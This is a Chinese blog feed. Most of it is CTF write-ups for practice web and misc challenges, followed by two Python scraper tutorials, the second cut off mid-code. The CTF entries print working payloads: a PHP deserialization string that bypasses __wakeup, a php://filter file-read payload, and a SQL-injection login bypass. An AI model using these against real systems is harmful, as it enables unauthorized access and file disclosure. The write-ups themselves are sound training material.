    <id>https://da4er.top/2-6-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP.html</id>
    <published>2020-02-06T03:06:11.000Z</published>
    <updated>2020-02-07T12:10:21.236Z</updated>
    
    <content type="html"><![CDATA[<p><strong>根据题目提示：题目有源码备份，下载得到<a href="http://www.zip。" target="_blank" rel="noopener">www.zip。</a></strong><br><img src="/2-6-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP/3.png" class title="This is an test image"><br><strong>有三个php文件</strong><br>class.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">class Name&#123;</span><br><span class="line">    private $username &#x3D; &#39;nonono&#39;;</span><br><span class="line">    private $password &#x3D; &#39;yesyes&#39;;</span><br><span class="line"></span><br><span class="line">    public function __construct($username,$password)&#123;</span><br><span class="line">        $this-&gt;username &#x3D; $username;</span><br><span class="line">        $this-&gt;password &#x3D; $password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">        $this-&gt;username &#x3D; &#39;guest&#39;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        if ($this-&gt;password !&#x3D; 100) &#123;</span><br><span class="line">            echo &quot;&lt;&#x2F;br&gt;NO!!!hacker!!!&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">            echo &quot;You name is: &quot;;</span><br><span class="line">            echo $this-&gt;username;echo &quot;&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">            echo &quot;You password is: &quot;;</span><br><span class="line">            echo $this-&gt;password;echo &quot;&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">            die();</span><br><span class="line">        &#125;</span><br><span class="line">        if ($this-&gt;username &#x3D;&#x3D;&#x3D; &#39;admin&#39;) &#123;</span><br><span class="line">            global $flag;</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &quot;&lt;&#x2F;br&gt;hello my friend~~&lt;&#x2F;br&gt;sorry i can&#39;t give you the flag!&quot;;</span><br><span class="line">            die();</span><br><span class="line"></span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><br>index.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    include &#39;class.php&#39;;</span><br><span class="line">    $select &#x3D; $_GET[&#39;select&#39;];</span><br><span class="line">    $res&#x3D;unserialize(@$select);</span><br><span class="line">    ?&gt;</span><br></pre></td></tr></table></figure><br>flag.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$flag &#x3D; &#39;Syc&#123;dog_dog_dog_dog&#125;&#39;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><br>通过分析知：$select进行反序列化。<br>关键在class.php中的_destruct()魔法函数。<br>对于序列化问题有调用魔法函数顺序的问题：<br><img src="/2-6-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP/4.png" class title="This is an test image"><br><img src="/2-6-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP/5.png" class title="This is an test image"><br>对于题目需要将username=admin，password=100，但是会先执行_wakeup函数将username=guest，所以这道题目关键在于如何绕过_wakeup函数。<br><strong>知识点：如何绕过_wakeup</strong><br><img src="/2-6-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP/6.png" class title="This is an test image"><br>测试php：<br><img src="/2-6-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP/1.png" class title="This is an test image"><br>形成payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">?select&#x3D;O:4:&quot;Name&quot;:3:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;&#125;</span><br></pre></td></tr></table></figure><br>这个payload绕过__wakeup()函数，使username不被覆盖，加上%00是因为username和password都是私有变量，变量中的类名前后会有空白符，而复制的时候会丢失。<br>得到flag<br><img src="/2-6-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP/2.png" class title="This is an test image"></p><p>参考博客：<br><a href="https://www.jianshu.com/p/bfe00fd583df" target="_blank" rel="noopener">https://www.jianshu.com/p/bfe00fd583df</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;根据题目提示：题目有源码备份，下载得到&lt;a href=&quot;http://www.zip。&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;www.zip。&lt;/a&gt;&lt;/strong&gt;&lt;br&gt;&lt;img src=&quot;/2-6-%E6%9E%81%E5%
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://da4er.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://da4er.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>2-6 [SWPU2019]你有没有好好看网课?</title>
    <link href="https://da4er.top/2-6-SWPU2019-%E4%BD%A0%E6%9C%89%E6%B2%A1%E6%9C%89%E5%A5%BD%E5%A5%BD%E7%9C%8B%E7%BD%91%E8%AF%BE.html"/>
    <id>https://da4er.top/2-6-SWPU2019-%E4%BD%A0%E6%9C%89%E6%B2%A1%E6%9C%89%E5%A5%BD%E5%A5%BD%E7%9C%8B%E7%BD%91%E8%AF%BE.html</id>
    <published>2020-02-05T16:04:21.000Z</published>
    <updated>2020-02-07T07:52:03.208Z</updated>
    
    <content type="html"><![CDATA[<p><strong>flag2.php，flag3.php都有密码：flag3.php提示密码是六位数，爆破得到密码。</strong><br><img src data-echo="2-6-SWPU2019-你有没有好好看网课/1.png" alt="2-6-SWPU2019-你有没有好好看网课"><br><strong>查看flag.docx</strong><br><img src data-echo="2-6-SWPU2019-你有没有好好看网课/5.png" alt="2-6-SWPU2019-你有没有好好看网课"><br>看了别的师傅的wp，这个docx提示查看mp4对应帧数:<strong>00:00:05:20；00:00:07:11</strong><br><img src data-echo="2-6-SWPU2019-你有没有好好看网课/2.png" alt="2-6-SWPU2019-你有没有好好看网课"><br><img src data-echo="2-6-SWPU2019-你有没有好好看网课/3.png" alt="2-6-SWPU2019-你有没有好好看网课"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">..... ..&#x2F;... .&#x2F;... .&#x2F;... ..&#x2F;dXBfdXBfdXA&#x3D;</span><br></pre></td></tr></table></figure><br>后面一段是base64编码，前面的一段一开始以为是摩斯编码，但是看了wp知道了是敲击码。<br><img src data-echo="2-6-SWPU2019-你有没有好好看网课/4.png" alt="2-6-SWPU2019-你有没有好好看网课"><br>解的flag2.zip密码：<strong>wllmup_up_up</strong><br><strong>flag2.zip下是一张图片，将这张图片用winhex打开，在最下面得到flag。</strong><br><img src data-echo="2-6-SWPU2019-你有没有好好看网课/6.png" alt="2-6-SWPU2019-你有没有好好看网课"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;flag2.php，flag3.php都有密码：flag3.php提示密码是六位数，爆破得到密码。&lt;/strong&gt;&lt;br&gt;&lt;img src data-echo=&quot;2-6-SWPU2019-你有没有好好看网课/1.png&quot; alt=&quot;2-6-SWPU2019
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://da4er.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://da4er.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>2.5 [极客大挑战 2019]Havefun&amp;Secret File</title>
    <link href="https://da4er.top/2-5-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Havefun-Secret-File.html"/>
    <id>https://da4er.top/2-5-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Havefun-Secret-File.html</id>
    <published>2020-02-05T14:43:55.000Z</published>
    <updated>2020-02-07T12:10:01.944Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Havefun"><a href="#Havefun" class="headerlink" title="Havefun"></a>Havefun</h2><p><strong>查看源代码</strong><br><img src="/2-5-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Havefun-Secret-File/1.png" class title="This is an test image"><br><strong>直接传参cat=dog,得到flag.</strong><br><img src="/2-5-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Havefun-Secret-File/2.png" class title="This is an test image"></p><h2 id="Secret-File"><a href="#Secret-File" class="headerlink" title="Secret File"></a>Secret File</h2><p><strong>通过查看源代码知道这个题目有三个文件:Archive_room.php action.php end.php</strong><br>在这里通过访问：Archive_room.php会直接跳转到end.php，没有经过action.php。<br><strong>访问action.php抓包查看，得到第四个文件secr3t.php 。</strong><br><img src="/2-5-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Havefun-Secret-File/3.png" class title="This is an test image"><br>访问secr3t.php 得到源码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    $file&#x3D;$_GET[&#39;file&#39;];</span><br><span class="line">    if(strstr($file,&quot;..&#x2F;&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123;</span><br><span class="line">        echo &quot;Oh no!&quot;;</span><br><span class="line">        exit();</span><br><span class="line">    &#125;</span><br><span class="line">    include($file); &#x2F;&#x2F;flag放在了flag.php里?&gt;</span><br></pre></td></tr></table></figure><br><strong>通过分析这段代码没有过滤php伪协议：我们可以使用file来读取flag。</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure><br>得到flag：<br><img src="/2-5-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Havefun-Secret-File/4.png" class title="This is an test image"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Havefun&quot;&gt;&lt;a href=&quot;#Havefun&quot; class=&quot;headerlink&quot; title=&quot;Havefun&quot;&gt;&lt;/a&gt;Havefun&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;查看源代码&lt;/strong&gt;&lt;br&gt;&lt;img src=&quot;/2-5-%E6%9E%81
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://da4er.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://da4er.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>2.5 [极客大挑战 2019]EasySQL</title>
    <link href="https://da4er.top/2-5-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-EasySQL.html"/>
    <id>https://da4er.top/2-5-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-EasySQL.html</id>
    <published>2020-02-05T14:23:34.000Z</published>
    <updated>2020-02-07T12:09:51.364Z</updated>
    
    <content type="html"><![CDATA[<p><strong>对题目进行简单的分析：单引号闭合；开启了错误提示。想到报错注入，但是报错注入没检测无法利用。</strong><br><img src="/2-5-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-EasySQL/1.png" class title="This is an test image"><br><img src="/2-5-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-EasySQL/2.png" class title="This is an test image"></p><hr><p><strong>尝试一下万能密码</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#39; or &#39;1&#x3D;1</span><br></pre></td></tr></table></figure><br>得到flag<br><img src="/2-5-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-EasySQL/3.png" class title="This is an test image"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;对题目进行简单的分析：单引号闭合；开启了错误提示。想到报错注入，但是报错注入没检测无法利用。&lt;/strong&gt;&lt;br&gt;&lt;img src=&quot;/2-5-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Easy
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://da4er.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://da4er.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>2.5 [SWPU2019]伟大的侦探</title>
    <link href="https://da4er.top/2-5-SWPU2019-%E4%BC%9F%E5%A4%A7%E7%9A%84%E4%BE%A6%E6%8E%A2.html"/>
    <id>https://da4er.top/2-5-SWPU2019-%E4%BC%9F%E5%A4%A7%E7%9A%84%E4%BE%A6%E6%8E%A2.html</id>
    <published>2020-02-05T11:20:21.000Z</published>
    <updated>2020-02-07T12:00:01.449Z</updated>
    
    <content type="html"><![CDATA[<p><strong>打开压缩包，文件有密码，密码在txt里</strong><br><img src="/2-5-SWPU2019-%E4%BC%9F%E5%A4%A7%E7%9A%84%E4%BE%A6%E6%8E%A2/1.png" class title="This is an test image"><br><strong>010Editor打开，转化成EBDIC编码得到密码</strong><br><img src="/2-5-SWPU2019-%E4%BC%9F%E5%A4%A7%E7%9A%84%E4%BE%A6%E6%8E%A2/2.png" class title="This is an test image"><br><strong>打开文件发现是一堆小人，百度可知这是福尔摩斯小人编码</strong><br><img src="/2-5-SWPU2019-%E4%BC%9F%E5%A4%A7%E7%9A%84%E4%BE%A6%E6%8E%A2/3.png" class title="This is an test image"><br><strong>解码得到flag:iloveholmesandwllm</strong><br><img src="/2-5-SWPU2019-%E4%BC%9F%E5%A4%A7%E7%9A%84%E4%BE%A6%E6%8E%A2/4.png" class title="This is an test image"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;打开压缩包，文件有密码，密码在txt里&lt;/strong&gt;&lt;br&gt;&lt;img src=&quot;/2-5-SWPU2019-%E4%BC%9F%E5%A4%A7%E7%9A%84%E4%BE%A6%E6%8E%A2/1.png&quot; class title=&quot;This is
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://da4er.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://da4er.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>实战_爬取中国天气网</title>
    <link href="https://da4er.top/%E5%AE%9E%E6%88%98-%E7%88%AC%E5%8F%96%E4%B8%AD%E5%9B%BD%E5%A4%A9%E6%B0%94%E7%BD%91.html"/>
    <id>https://da4er.top/%E5%AE%9E%E6%88%98-%E7%88%AC%E5%8F%96%E4%B8%AD%E5%9B%BD%E5%A4%A9%E6%B0%94%E7%BD%91.html</id>
    <published>2020-02-05T10:52:26.000Z</published>
    <updated>2020-02-07T12:12:10.755Z</updated>
    
    <content type="html"><![CDATA[<h4 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h4><p>将中国天气网所有城市的最低气温爬取下来，将最低气温的前十名可视化显示出来。<br><strong>这个爬虫比较简单没有做反爬处理，所以对于获取html代码比较简单，关键在于如何解析得到的html代码。</strong></p><hr><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line">from pyecharts.charts.bar import Bar</span><br><span class="line">ALL_DATA&#x3D;[]</span><br><span class="line">def parse_page(url):</span><br><span class="line">    headers&#x3D;&#123;</span><br><span class="line">        &quot;User-Agent&quot;:&quot;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;71.0.3578.98 Safari&#x2F;537.36&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    resp&#x3D;requests.get(url,headers&#x3D;headers)</span><br><span class="line">    #print(resp.text)</span><br><span class="line">    text&#x3D;resp.content.decode(&quot;utf-8&quot;)</span><br><span class="line">    # print(text)</span><br><span class="line">    #这里使用的解析器是html5lib，因为在使用常用的lxml解析器容错率不好，港澳台天气这个页面html书写不规范，从而无法正常爬取。</span><br><span class="line">    #pip install html5lib</span><br><span class="line">    soup&#x3D;BeautifulSoup(text,&quot;html5lib&quot;)</span><br><span class="line">    divs&#x3D;soup.find(&quot;div&quot;,class_&#x3D;&quot;conMidtab&quot;) #获取第一个div标签</span><br><span class="line">    tables&#x3D;divs.find_all(&quot;table&quot;)</span><br><span class="line">    for table in tables:</span><br><span class="line">        trs&#x3D;table.find_all(&quot;tr&quot;)[2:]</span><br><span class="line">        for index,tr in enumerate(trs):</span><br><span class="line">            # print(tr)</span><br><span class="line">            # print(&quot;&#x3D;&quot;*30)</span><br><span class="line">            tds&#x3D;tr.find_all(&quot;td&quot;)</span><br><span class="line">            if(index&#x3D;&#x3D;0):</span><br><span class="line">                city_td&#x3D;tds[1]</span><br><span class="line">            else:</span><br><span class="line">                city_td&#x3D;tds[0]</span><br><span class="line">            city&#x3D;list(city_td.stripped_strings)[0]</span><br><span class="line">            # print(city)</span><br><span class="line">            temp_td&#x3D;tds[-2]</span><br><span class="line">            temp&#x3D;list(temp_td.stripped_strings)[0]</span><br><span class="line">            # print(&#123;&#39;city&#39;:city,&#39;temp&#39;:temp&#125;)</span><br><span class="line">            data&#x3D;&#123;&#39;city&#39;:city,&#39;temp&#39;:int(temp)&#125;</span><br><span class="line">            ALL_DATA.append(data)</span><br><span class="line">def spider():</span><br><span class="line">    base_url&#x3D;&quot;http:&#x2F;&#x2F;www.weather.com.cn&#x2F;textFC&#x2F;&#123;&#125;.shtml&quot;</span><br><span class="line">    params&#x3D;[&quot;hb&quot;,&quot;db&quot;,&quot;hd&quot;,&quot;hz&quot;,&quot;hn&quot;,&quot;xb&quot;,&quot;xn&quot;,&quot;gat&quot;]</span><br><span class="line">    for param in params:</span><br><span class="line">        url&#x3D;base_url.format(param)</span><br><span class="line">        parse_page(url)</span><br><span class="line">    ALL_DATA.sort(key&#x3D;lambda x:x[&#39;temp&#39;])</span><br><span class="line">    # print(ALL_DATA)</span><br><span class="line">    data&#x3D;ALL_DATA[0:10]</span><br><span class="line">    cicties&#x3D;list(map(lambda x:x[&#39;city&#39;],data))</span><br><span class="line">    temps&#x3D;list(map(lambda x:x[&#39;temp&#39;],data))</span><br><span class="line">    chart&#x3D;Bar(&quot;中国天气排行榜&quot;)</span><br><span class="line">    chart.add(&quot;&quot;,cicties,temps)</span><br><span class="line">    chart.render(&#39;temp.html&#39;)</span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    spider()</span><br></pre></td></tr></table></figure><hr><h4 id="要点"><a href="#要点" class="headerlink" title="要点"></a>要点</h4><p>这里使用的是beautifulsoup库，用的解析器是html5lib；因为在爬取港澳台地区的天气时，这个页面的html代码写的不规范。如果我们使用常用的lxml解析器的话会无法正常爬取。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install html5lib</span><br></pre></td></tr></table></figure><br><img src="/%E5%AE%9E%E6%88%98-%E7%88%AC%E5%8F%96%E4%B8%AD%E5%9B%BD%E5%A4%A9%E6%B0%94%E7%BD%91/1.png" class title="This is an test image"><br><strong>这里是这段代码比较重要的部分，通过sort函数对得到的数据进行排序，’key=’参数指定按什么关键字排序。</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ALL_DATA.sort(key&#x3D;lambda x:x[&#39;temp&#39;])</span><br></pre></td></tr></table></figure><br>这里是按照字典中的temp参数进行排序</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cicties&#x3D;list(map(lambda x:x[&#39;city&#39;],data))</span><br><span class="line">temps&#x3D;list(map(lambda x:x[&#39;temp&#39;],data))</span><br></pre></td></tr></table></figure><p>这段代码是通过lambda和map()将城市和对应的最低温度形成单个的列表</p><hr><h4 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h4><p><strong>效果如图：</strong></p><img src="/%E5%AE%9E%E6%88%98-%E7%88%AC%E5%8F%96%E4%B8%AD%E5%9B%BD%E5%A4%A9%E6%B0%94%E7%BD%91/2.png" class title="This is an test image">]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;目标&quot;&gt;&lt;a href=&quot;#目标&quot; class=&quot;headerlink&quot; title=&quot;目标&quot;&gt;&lt;/a&gt;目标&lt;/h4&gt;&lt;p&gt;将中国天气网所有城市的最低气温爬取下来，将最低气温的前十名可视化显示出来。&lt;br&gt;&lt;strong&gt;这个爬虫比较简单没有做反爬处理，所以对于获
      
    
    </summary>
    
    
      <category term="爬虫" scheme="https://da4er.top/categories/%E7%88%AC%E8%99%AB/"/>
    
    
      <category term="爬虫" scheme="https://da4er.top/tags/%E7%88%AC%E8%99%AB/"/>
    
  </entry>
  
  <entry>
    <title>爬虫实战_电影天堂爬虫</title>
    <link href="https://da4er.top/%E7%88%AC%E8%99%AB%E5%AE%9E%E6%88%98-%E7%94%B5%E5%BD%B1%E5%A4%A9%E5%A0%82%E7%88%AC%E8%99%AB.html"/>
    <id>https://da4er.top/%E7%88%AC%E8%99%AB%E5%AE%9E%E6%88%98-%E7%94%B5%E5%BD%B1%E5%A4%A9%E5%A0%82%E7%88%AC%E8%99%AB.html</id>
    <published>2020-02-05T05:23:21.000Z</published>
    <updated>2020-02-07T12:12:02.667Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p><strong>近段时间一直在学习爬虫，昨天闲来无事做了一个简单的小爬虫来爬取电影天堂热门电影的前7页。本爬虫利用requests库和lxml库结合来解析得到的html代码，当然也可以使用BeautifulSoup库来解析，但我比较喜欢lxml库和XPATH语法相结合的解析。</strong></p><hr><p><strong>这个实战是爬取电影天堂热门电影前七页。分为三步：1.获取每个页面的电影详细页；2.解析每个电影详细页；3.将第一步和第二步结合，爬取前七页。</strong></p><hr><p>具体代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from lxml import etree</span><br><span class="line">BASE_DOMAIN&#x3D;&quot;https:&#x2F;&#x2F;www.dytt8.net&quot;</span><br><span class="line">HEADERS&#x3D;&#123;</span><br><span class="line">    &quot;User-Agent&quot;:&quot;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;71.0.3578.98 Safari&#x2F;537.36&quot;</span><br><span class="line">&#125;</span><br><span class="line">def get_detail_url(url):</span><br><span class="line">    resp &#x3D; requests.get(url, headers&#x3D;HEADERS)</span><br><span class="line">    text &#x3D; resp.text</span><br><span class="line">    # print(text)</span><br><span class="line">    html &#x3D; etree.HTML(text)</span><br><span class="line">    detail_urls &#x3D; html.xpath(&quot;&#x2F;&#x2F;ul&#x2F;&#x2F;table[@class&#x3D;&#39;tbspan&#39;]&#x2F;&#x2F;a&#x2F;@href&quot;)</span><br><span class="line">    # def abc(url1):</span><br><span class="line">    #     return BASE_DOMAIN+url1</span><br><span class="line">    # index&#x3D;0</span><br><span class="line">    # for detail_url in detail_urls:</span><br><span class="line">    #         detail_url &#x3D; abc(detail_url)</span><br><span class="line">    #         detail_urls[index]&#x3D;detail_url</span><br><span class="line">    #         index &#x3D;index+1</span><br><span class="line">    detail_urls&#x3D;map(lambda url:BASE_DOMAIN+url,detail_urls)</span><br><span class="line">    return detail_urls</span><br><span class="line">def parse_detail_page(url):</span><br><span class="line">    resp&#x3D;requests.get(url,headers&#x3D;HEADERS)</span><br><span class="line">    text&#x3D;resp.content.decode(&quot;gbk&quot;)</span><br><span class="line">    movie&#x3D;&#123;&#125;</span><br><span class="line">    #print(text)</span><br><span class="line">    html&#x3D;etree.HTML(text)</span><br><span class="line">    #电影名称</span><br><span class="line">    title&#x3D;html.xpath(&quot;&#x2F;&#x2F;div[@class&#x3D;&#39;title_all&#39;]&#x2F;&#x2F;font[@color&#x3D;&#39;#07519a&#39;]&#x2F;&#x2F;text()&quot;)[0]</span><br><span class="line">    movie[&#39;title&#39;]&#x3D;title</span><br><span class="line">    #电影海报</span><br><span class="line">    img&#x3D;html.xpath(&quot;&#x2F;&#x2F;div[@id&#x3D;&#39;Zoom&#39;]&#x2F;&#x2F;img&#x2F;@src&quot;)</span><br><span class="line">    cover&#x3D;img</span><br><span class="line">    movie[&#39;cover&#39;]&#x3D;cover</span><br><span class="line">    #div下所有文本</span><br><span class="line">    infos&#x3D;html.xpath(&quot;&#x2F;&#x2F;div[@id&#x3D;&#39;Zoom&#39;]&#x2F;&#x2F;text()&quot;)</span><br><span class="line">    for index,info in enumerate(infos):</span><br><span class="line">        def 